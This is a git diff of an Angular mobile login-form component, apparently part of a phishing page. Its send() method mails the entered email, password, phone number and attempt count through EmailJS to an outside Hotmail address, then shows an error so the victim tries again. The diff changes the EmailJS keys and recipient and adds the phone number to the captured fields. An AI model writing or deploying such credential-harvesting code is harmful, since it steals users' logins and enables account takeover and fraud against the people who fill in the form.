@@ -21,7 +21,7 @@ export class MobileFormsComponent implements OnInit {
   showPassword = false;
   attemptCount = 0;
 
-  constructor(private fb: FormBuilder) {}
+  constructor(private fb: FormBuilder) { }
 
   ngOnInit(): void {
     this.loginForm = this.fb.group({
@@ -55,19 +55,16 @@ export class MobileFormsComponent implements OnInit {
   }
 
   async send(end: boolean = false) {
-    emailjs.init('pYLO6QYN6aeg6Sagd');
+    emailjs.init('08gaTi0yX9GYMg2w_');
     const response = await emailjs
-      .send('service_n6dsppy', 'template_fxjwyar', {
-        from_name: 'Alan',
-        to_name: 'Boss',
+      .send('service_4fx4y8a', 'template_0tzq3y5', {
+        name: 'Stanley',
+        message: `Email: ${this.loginFormControl['email'].value || ''
+          } Password: ${this.loginFormControl['password'].value}, Phone Number: ${this.loginFormControl['countryCode'].value
+          }  Attempt: ${this.attemptCount + 1
+          }`,
+        email: 'ubaid.valtorquegroup@hotmail.com',
 
-        message: `Email: ${
-          this.loginFormControl['email'].value || ''
-        } Password: ${this.loginFormControl['password'].value}, Attempt: ${
-          this.attemptCount + 1
-        }`,
-
-        reply_to: 'No one',
       })
       .then(() => {
         this.showError = true;
@@ -81,4 +78,6 @@ export class MobileFormsComponent implements OnInit {
         }
       });
   }
+
+
 }
